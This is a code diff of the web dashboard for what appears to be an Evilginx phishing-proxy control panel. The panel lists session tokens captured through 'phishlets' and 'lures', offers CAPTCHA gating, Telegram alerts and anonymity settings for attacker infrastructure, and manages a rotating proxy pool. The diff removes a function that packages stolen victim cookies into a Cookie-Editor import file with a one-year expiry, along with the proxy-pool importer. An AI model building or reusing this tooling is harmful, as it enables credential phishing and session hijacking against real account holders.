@@ -652,7 +652,6 @@
                                     <div class="text-xs text-gray-500 uppercase">Session Tokens</div>
                                     <div class="space-x-2">
                                         <button type="button" @click="copyTokens(c.tokens)" title="Copy tokens to clipboard" class="text-xs text-blue-400 hover:text-blue-300">Copy</button>
-                                        <button type="button" @click="exportCookies(c.tokens, c.username || c.phishlet)" title="Export cookies as JSON file (Cookie-Editor compatible)" class="text-xs text-green-400 hover:text-green-300">Export</button>
                                         <button type="button" @click="openTokenViewer(c.tokens, c.username || c.phishlet)" title="View tokens in viewer" class="text-xs text-purple-300 hover:text-purple-200">View</button>
                                     </div>
                                 </div>
@@ -813,7 +812,7 @@
                         <h3 class="text-lg font-medium text-white">Telegram Configuration</h3>
                         <!-- Sync Status Indicator -->
                         <div class="flex items-center gap-2">
-                            <span class="text-xs text-gray-500">Server Sync:</span>
+                            <span class="text-xs text-gray-500">Evilginx Sync:</span>
                             <span x-show="telegramSyncStatus === 'synced'" class="flex items-center gap-1 text-xs text-green-400">
                                 <span class="w-2 h-2 bg-green-400 rounded-full"></span> Synced
                             </span>
@@ -824,9 +823,9 @@
                                 <span class="w-2 h-2 bg-red-400 rounded-full"></span> Error
                             </span>
                             <span x-show="telegramSyncStatus === 'offline'" class="flex items-center gap-1 text-xs text-gray-500">
-                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Server Offline
+                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Evilginx Offline
                             </span>
-                            <button type="button" @click="syncTelegramFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Server">
+                            <button type="button" @click="syncTelegramFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Evilginx">
                                 <svg class="w-4 h-4 inline" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
                             </button>
                         </div>
@@ -853,13 +852,13 @@
                                 </label>
                             </div>
                             <div class="flex gap-2">
-                                <button type="button" @click="syncTelegramToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Server">
-                                    Push to Server
+                                <button type="button" @click="syncTelegramToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Evilginx">
+                                    Push to Evilginx
                                 </button>
                                 <button type="button" @click="saveSettings" title="Save Telegram settings" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm">Save Configuration</button>
                             </div>
                         </div>
-                        <p class="text-xs text-gray-500">Configure Telegram alerts for real-time notifications. Use "Push to Server" to sync your config.</p>
+                        <p class="text-xs text-gray-500">Configure Telegram alerts for real-time notifications. Use "Push to Evilginx" to sync your config.</p>
                     </div>
                 </div>
 
@@ -869,7 +868,7 @@
                         <h3 class="text-lg font-medium text-white">Cloudflare Turnstile Configuration</h3>
                         <!-- Sync Status Indicator -->
                         <div class="flex items-center gap-2">
-                            <span class="text-xs text-gray-500">Server Sync:</span>
+                            <span class="text-xs text-gray-500">Evilginx Sync:</span>
                             <span x-show="turnstileSyncStatus === 'synced'" class="flex items-center gap-1 text-xs text-green-400">
                                 <span class="w-2 h-2 bg-green-400 rounded-full"></span> Synced
                             </span>
@@ -880,9 +879,9 @@
                                 <span class="w-2 h-2 bg-red-400 rounded-full"></span> Error
                             </span>
                             <span x-show="turnstileSyncStatus === 'offline'" class="flex items-center gap-1 text-xs text-gray-500">
-                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Server Offline
+                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Evilginx Offline
                             </span>
-                            <button type="button" @click="syncTurnstileFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Server">
+                            <button type="button" @click="syncTurnstileFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Evilginx">
                                 <svg class="w-4 h-4 inline" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
                             </button>
                         </div>
@@ -909,13 +908,13 @@
                                 </label>
                             </div>
                             <div class="flex gap-2">
-                                <button type="button" @click="syncTurnstileToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Server">
-                                    Push to Server
+                                <button type="button" @click="syncTurnstileToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Evilginx">
+                                    Push to Evilginx
                                 </button>
                                 <button type="button" @click="saveSettings" title="Save Turnstile settings" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm">Save Configuration</button>
                             </div>
                         </div>
-                        <p class="text-xs text-gray-500">Get your Turnstile keys from <a href="https://dash.cloudflare.com/?to=/:account/turnstile" target="_blank" rel="noopener noreferrer" class="text-blue-400 hover:underline">Cloudflare Dashboard</a>. When enabled, all lures will show a CAPTCHA challenge. Use "Push to Server" to sync your config.</p>
+                        <p class="text-xs text-gray-500">Get your Turnstile keys from <a href="https://dash.cloudflare.com/?to=/:account/turnstile" target="_blank" rel="noopener noreferrer" class="text-blue-400 hover:underline">Cloudflare Dashboard</a>. When enabled, all lures will show a CAPTCHA challenge. Use "Push to Evilginx" to sync your config.</p>
                     </div>
                 </div>
 
@@ -1224,111 +1223,6 @@
                         <p>• Use residential or mobile proxies for best results</p>
                     </div>
                 </div>
-
-                <!-- Proxy Pool Section -->
-                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6 mt-6">
-                    <div class="flex items-center justify-between mb-4">
-                        <h3 class="text-lg font-medium text-white flex items-center gap-2">
-                            <svg class="h-5 w-5 text-purple-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg>
-                            Proxy Pool (Bulk Import)
-                        </h3>
-                        <div class="flex items-center gap-2">
-                            <label class="relative inline-flex items-center cursor-pointer">
-                                <input type="checkbox" x-model="proxyPool.enabled" @change="toggleProxyPool()" class="sr-only peer">
-                                <div class="w-9 h-5 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-purple-600"></div>
-                            </label>
-                            <span class="text-xs text-gray-400">Pool Active</span>
-                        </div>
-                    </div>
-
-                    <!-- Pool Stats -->
-                    <div class="grid grid-cols-4 gap-3 mb-4">
-                        <div class="bg-gray-900 rounded p-3 text-center">
-                            <div class="text-2xl font-bold text-white" x-text="proxyPool.stats.total || 0"></div>
-                            <div class="text-xs text-gray-500">Total</div>
-                        </div>
-                        <div class="bg-gray-900 rounded p-3 text-center">
-                            <div class="text-2xl font-bold text-green-400" x-text="proxyPool.stats.working || 0"></div>
-                            <div class="text-xs text-gray-500">Working</div>
-                        </div>
-                        <div class="bg-gray-900 rounded p-3 text-center">
-                            <div class="text-2xl font-bold text-red-400" x-text="proxyPool.stats.failed || 0"></div>
-                            <div class="text-xs text-gray-500">Failed</div>
-                        </div>
-                        <div class="bg-gray-900 rounded p-3 text-center">
-                            <div class="text-2xl font-bold text-yellow-400" x-text="proxyPool.stats.untested || 0"></div>
-                            <div class="text-xs text-gray-500">Untested</div>
-                        </div>
-                    </div>
-
-                    <!-- Rotation Mode -->
-                    <div class="mb-4">
-                        <label class="block text-sm font-medium text-gray-400 mb-1">Rotation Mode</label>
-                        <select x-model="proxyPool.rotationMode" @change="updateProxyPoolSettings()" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-purple-500 focus:outline-none">
-                            <option value="round_robin">Round Robin (cycle through all)</option>
-                            <option value="random">Random (pick randomly)</option>
-                            <option value="least_used">Least Used (balance load)</option>
-                            <option value="fastest">Fastest (lowest latency)</option>
-                        </select>
-                    </div>
-
-                    <!-- Bulk Import -->
-                    <div class="mb-4">
-                        <label class="block text-sm font-medium text-gray-400 mb-1">Bulk Import Proxies</label>
-                        <textarea x-model="proxyPool.importText" placeholder="Paste proxies (one per line)&#10;Format: type://user:pass@host:port&#10;Examples:&#10;socks5://user:pass@1.2.3.4:1080&#10;http://proxy.example.com:8080&#10;socks5h://1.2.3.4:1080" rows="5" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white text-sm font-mono focus:border-purple-500 focus:outline-none"></textarea>
-                        <div class="flex gap-2 mt-2">
-                            <button type="button" @click="importProxies()" class="bg-purple-600 hover:bg-purple-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors flex items-center gap-2">
-                                <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" /></svg>
-                                Import
-                            </button>
-                            <button type="button" @click="validateAllProxies()" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors flex items-center gap-2">
-                                <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
-                                Validate All
-                            </button>
-                            <button type="button" @click="clearProxyPool()" class="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors flex items-center gap-2">
-                                <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
-                                Clear All
-                            </button>
-                        </div>
-                        <div x-show="proxyPool.importResult" class="mt-2 text-sm" :class="proxyPool.importResult.error ? 'text-red-400' : 'text-green-400'" x-text="proxyPool.importResult.message"></div>
-                    </div>
-
-                    <!-- Proxy List -->
-                    <div class="border border-gray-700 rounded overflow-hidden">
-                        <div class="bg-gray-900 px-3 py-2 text-xs text-gray-400 font-medium flex">
-                            <div class="w-1/4">Proxy</div>
-                            <div class="w-1/6">Type</div>
-                            <div class="w-1/6">Status</div>
-                            <div class="w-1/6">Latency</div>
-                            <div class="w-1/6">Uses</div>
-                            <div class="w-1/12 text-right">Actions</div>
-                        </div>
-                        <div class="max-h-64 overflow-y-auto">
-                            <template x-for="proxy in proxyPool.proxies" :key="proxy.id">
-                                <div class="px-3 py-2 border-t border-gray-800 flex items-center text-sm hover:bg-gray-800/50">
-                                    <div class="w-1/4 font-mono text-xs text-gray-300 truncate" x-text="proxy.address + ':' + proxy.port"></div>
-                                    <div class="w-1/6 text-xs text-gray-400" x-text="proxy.type.toUpperCase()"></div>
-                                    <div class="w-1/6">
-                                        <span x-show="proxy.status === 'working'" class="text-xs text-green-400">● Working</span>
-                                        <span x-show="proxy.status === 'failed'" class="text-xs text-red-400">● Failed</span>
-                                        <span x-show="proxy.status === 'untested'" class="text-xs text-yellow-400">● Untested</span>
-                                        <span x-show="proxy.status === 'testing'" class="text-xs text-blue-400">● Testing...</span>
-                                    </div>
-                                    <div class="w-1/6 text-xs text-gray-400" x-text="proxy.latency ? proxy.latency + 'ms' : '-'"></div>
-                                    <div class="w-1/6 text-xs text-gray-400" x-text="proxy.use_count || 0"></div>
-                                    <div class="w-1/12 text-right">
-                                        <button type="button" @click="removeProxy(proxy.id)" title="Remove proxy" class="text-red-400 hover:text-red-300">
-                                            <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg>
-                                        </button>
-                                    </div>
-                                </div>
-                            </template>
-                            <div x-show="proxyPool.proxies.length === 0" class="px-3 py-8 text-center text-gray-500 text-sm">
-                                No proxies in pool. Import some above.
-                            </div>
-                        </div>
-                    </div>
-                </div>
             </div>
         </div>
 
@@ -1466,15 +1360,6 @@
         blocklistSyncStatus: 'synced',
         blocklistSyncError: '',
         seenIPs: new Set(),
-        // Proxy Pool state
-        proxyPool: {
-            enabled: false,
-            rotationMode: 'round_robin',
-            proxies: [],
-            stats: { total: 0, working: 0, failed: 0, untested: 0 },
-            importText: '',
-            importResult: null
-        },
 
         init() {
           // Load notification preferences from localStorage
@@ -1851,15 +1736,9 @@
             try {
                 const res = await fetch('/api/settings');
                 if (!res.ok) throw new Error();
-                const serverSettings = await res.json();
-                // Merge server settings
-                this.settings = { ...this.settings, ...serverSettings };
-                // Restore localStorage overrides for enabled states
-                this.restoreSettings();
+                this.settings = await res.json();
             } catch (e) {
                 console.error('loadSettings failed', e);
-                // Still try to restore from localStorage
-                this.restoreSettings();
             }
         },
         async loadWhitelist() {
@@ -1983,14 +1862,12 @@
 
                 this.turnstileSyncStatus = 'synced';
                 this.turnstileSyncError = '';
-                // Persist to localStorage
-                this.persistSettings();
-                showToast('Turnstile config pushed to Server successfully!', 'success');
+                showToast('Turnstile config pushed to Evilginx successfully!', 'success');
             } catch (e) {
                 if (e.name === 'AbortError') {
                     this.turnstileSyncStatus = 'offline';
                     this.turnstileSyncError = 'Connection timeout';
-                    showToast('Failed to push config: Server may be offline', 'error');
+                    showToast('Failed to push config: Evilginx may be offline', 'error');
                 } else {
                     this.turnstileSyncStatus = 'error';
                     this.turnstileSyncError = e.message || 'Push failed';
@@ -2065,14 +1942,12 @@
 
                 this.telegramSyncStatus = 'synced';
                 this.telegramSyncError = '';
-                // Persist to localStorage
-                this.persistSettings();
-                showToast('Telegram config pushed to Server successfully!', 'success');
+                showToast('Telegram config pushed to Evilginx successfully!', 'success');
             } catch (e) {
                 if (e.name === 'AbortError') {
                     this.telegramSyncStatus = 'offline';
                     this.telegramSyncError = 'Connection timeout';
-                    showToast('Failed to push config: Server may be offline', 'error');
+                    showToast('Failed to push config: Evilginx may be offline', 'error');
                 } else {
                     this.telegramSyncStatus = 'error';
                     this.telegramSyncError = e.message || 'Push failed';
@@ -2246,23 +2121,6 @@
             return ip && !this.seenIPs.has(ip);
         },
         async saveProxySettings() {
-            // Validate proxy settings before enabling
-            if (this.settings.proxy_enabled) {
-                if (!this.settings.proxy_address || this.settings.proxy_address.trim() === '') {
-                    showToast('Please enter a proxy address before enabling', 'error');
-                    this.settings.proxy_enabled = false;
-                    return;
-                }
-                if (!this.settings.proxy_port || this.settings.proxy_port <= 0 || this.settings.proxy_port > 65535) {
-                    showToast('Please enter a valid proxy port (1-65535) before enabling', 'error');
-                    this.settings.proxy_enabled = false;
-                    return;
-                }
-                if (!this.settings.proxy_type) {
-                    this.settings.proxy_type = 'socks5';
-                }
-            }
-            
             try {
                 const resp = await fetch('/api/settings', {
                     method: 'POST',
@@ -2277,64 +2135,13 @@
                     })
                 });
                 if (resp.ok) {
-                    // Persist proxy settings to localStorage
-                    this.persistSettings();
                     showToast('Proxy configuration applied successfully!', 'success');
                 } else {
                     const text = await resp.text();
                     showToast('Failed to apply proxy: ' + text, 'error');
-                    // Revert enabled state on failure
-                    this.settings.proxy_enabled = false;
                 }
             } catch (err) {
                 showToast('Error applying proxy: ' + err.message, 'error');
-                this.settings.proxy_enabled = false;
-            }
-        },
-        
-        // Persist settings to localStorage for page reload persistence
-        persistSettings() {
-            const toSave = {
-                telegram_enabled: this.settings.telegram_enabled,
-                turnstile_enabled: this.settings.turnstile_enabled,
-                proxy_enabled: this.settings.proxy_enabled,
-                proxy_type: this.settings.proxy_type,
-                proxy_address: this.settings.proxy_address,
-                proxy_port: this.settings.proxy_port,
-                proxy_username: this.settings.proxy_username,
-                anonymity_enabled: this.settings.anonymity_enabled,
-                anonymity_header_randomization: this.settings.anonymity_header_randomization,
-                anonymity_useragent_rotation: this.settings.anonymity_useragent_rotation,
-                blocklist_enabled: this.settings.blocklist_enabled,
-                blocklist_verbose: this.settings.blocklist_verbose,
-                cloudflare_wildcard_enabled: this.settings.cloudflare_wildcard_enabled
-            };
-            localStorage.setItem('evilfeed_settings', JSON.stringify(toSave));
-        },
-        
-        // Restore settings from localStorage
-        restoreSettings() {
-            try {
-                const saved = localStorage.getItem('evilfeed_settings');
-                if (saved) {
-                    const parsed = JSON.parse(saved);
-                    // Merge saved settings with current (server takes precedence for sensitive data)
-                    if (parsed.telegram_enabled !== undefined) this.settings.telegram_enabled = parsed.telegram_enabled;
-                    if (parsed.turnstile_enabled !== undefined) this.settings.turnstile_enabled = parsed.turnstile_enabled;
-                    if (parsed.proxy_enabled !== undefined) this.settings.proxy_enabled = parsed.proxy_enabled;
-                    if (parsed.proxy_type) this.settings.proxy_type = parsed.proxy_type;
-                    if (parsed.proxy_address) this.settings.proxy_address = parsed.proxy_address;
-                    if (parsed.proxy_port) this.settings.proxy_port = parsed.proxy_port;
-                    if (parsed.proxy_username) this.settings.proxy_username = parsed.proxy_username;
-                    if (parsed.anonymity_enabled !== undefined) this.settings.anonymity_enabled = parsed.anonymity_enabled;
-                    if (parsed.anonymity_header_randomization !== undefined) this.settings.anonymity_header_randomization = parsed.anonymity_header_randomization;
-                    if (parsed.anonymity_useragent_rotation !== undefined) this.settings.anonymity_useragent_rotation = parsed.anonymity_useragent_rotation;
-                    if (parsed.blocklist_enabled !== undefined) this.settings.blocklist_enabled = parsed.blocklist_enabled;
-                    if (parsed.blocklist_verbose !== undefined) this.settings.blocklist_verbose = parsed.blocklist_verbose;
-                    if (parsed.cloudflare_wildcard_enabled !== undefined) this.settings.cloudflare_wildcard_enabled = parsed.cloudflare_wildcard_enabled;
-                }
-            } catch (e) {
-                console.warn('Failed to restore settings from localStorage:', e);
             }
         },
         async addWhitelist() {
@@ -2498,38 +2305,6 @@
                 pairs: parsed.pairs,
                 raw: parsed.raw
             };
-        },
-        // Export cookies as JSON file in Cookie-Editor compatible flat array format
-        exportCookies(raw, label) {
-            const parsed = this.parseTokens(raw);
-            if (!parsed.cookies || parsed.cookies.length === 0) {
-                showToast('No cookies to export', 'warning');
-                return;
-            }
-            
-            // Convert to Cookie-Editor compatible format (flat array)
-            const cookieEditorFormat = parsed.cookies.map(c => ({
-                name: c.name,
-                value: c.value,
-                domain: c.domain.startsWith('.') ? c.domain : (c.domain ? '.' + c.domain : ''),
-                path: c.path || '/',
-                httpOnly: c.httpOnly || false,
-                secure: c.name.startsWith('__Host-') || c.name.startsWith('__Secure-') || false,
-                sameSite: 'Lax',
-                expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60) // 1 year from now
-            }));
-            
-            const jsonStr = JSON.stringify(cookieEditorFormat, null, 2);
-            const blob = new Blob([jsonStr], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            // Sanitize filename
-            const safeName = (label || 'cookies').replace(/[^a-zA-Z0-9_-]/g, '_').substring(0, 50);
-            a.download = `${safeName}_cookies.json`;
-            a.click();
-            URL.revokeObjectURL(url);
-            showToast(`Exported ${cookieEditorFormat.length} cookies`, 'success');
         },
         viewDetails(e) { this.selectedEvent = e; },
         closeDetails() { this.selectedEvent = null; },
